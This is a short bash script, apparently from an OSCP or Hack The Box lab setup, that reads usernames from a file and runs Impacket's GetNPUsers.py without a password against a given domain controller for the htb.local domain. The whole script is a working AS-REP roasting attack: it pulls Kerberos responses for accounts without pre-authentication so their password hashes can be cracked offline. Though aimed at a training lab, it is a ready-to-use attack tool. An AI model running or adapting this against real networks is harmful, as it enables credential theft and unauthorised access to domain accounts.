#!/bin/bash

for user in $(cat $2);
do ~/OSCP_Tools/impacket/GetNPUsers.py -no-pass -dc-ip $1 htb.local/${user} | grep -v Impacket;
done
